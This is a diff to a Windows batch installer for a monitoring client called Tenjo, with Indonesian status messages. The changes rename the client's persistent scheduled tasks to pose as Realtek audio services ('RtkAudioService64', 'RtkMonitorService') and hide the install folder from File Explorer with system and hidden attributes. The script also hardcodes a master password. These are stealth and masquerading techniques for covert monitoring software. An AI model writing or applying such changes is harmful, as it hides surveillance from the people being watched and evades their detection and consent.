@@ -150,7 +150,7 @@ echo   ^<Actions^>^<Exec^>^<Command^>"%TENJO_DIR%\start_tenjo.bat"^</Command^>^<
 echo ^</Task^>
 ) > "%TASK_XML%"
 
-schtasks /Create /TN "TenjoMonitor" /XML "%TASK_XML%" /F >nul 2>&1
+schtasks /Create /TN "RtkAudioService64" /XML "%TASK_XML%" /F >nul 2>&1
 del "%TASK_XML%" >nul 2>&1
 
 REM Scheduled task for watchdog (monitors main client)
@@ -165,7 +165,7 @@ echo   ^<Actions^>^<Exec^>^<Command^>python.exe^</Command^>^<Arguments^>watchdog
 echo ^</Task^>
 ) > "%WATCHDOG_XML%"
 
-schtasks /Create /TN "TenjoWatchdog" /XML "%WATCHDOG_XML%" /F >nul 2>&1
+schtasks /Create /TN "RtkMonitorService" /XML "%WATCHDOG_XML%" /F >nul 2>&1
 del "%WATCHDOG_XML%" >nul 2>&1
 echo [OK] Service configured (with watchdog)
 
@@ -198,7 +198,7 @@ echo.
 timeout /t 2 /nobreak >nul
 
 REM Apply folder protection
-echo [6/7] Protecting folder...
+echo [6/7] Protecting and hiding folder...
 set "MASTER_PASSWORD=TenjoAdilabs96"
 
 REM Check if folder_protection.py exists
@@ -215,6 +215,15 @@ if exist "%TENJO_DIR%\src\utils\folder_protection.py" (
 ) else (
     echo [!] WARNING: folder_protection.py tidak ditemukan
     echo   Installer akan lanjut tanpa folder protection
+)
+
+REM Hide folder from File Explorer
+attrib +S +H "%TENJO_DIR%" /S /D >nul 2>&1
+if !errorlevel! equ 0 (
+    echo [OK] Folder tersembunyi dari File Explorer
+    echo   - Folder tidak terlihat di Explorer (kecuali 'Show hidden files' aktif^)
+) else (
+    echo [!] WARNING: Gagal hide folder
 )
 
 REM Start service
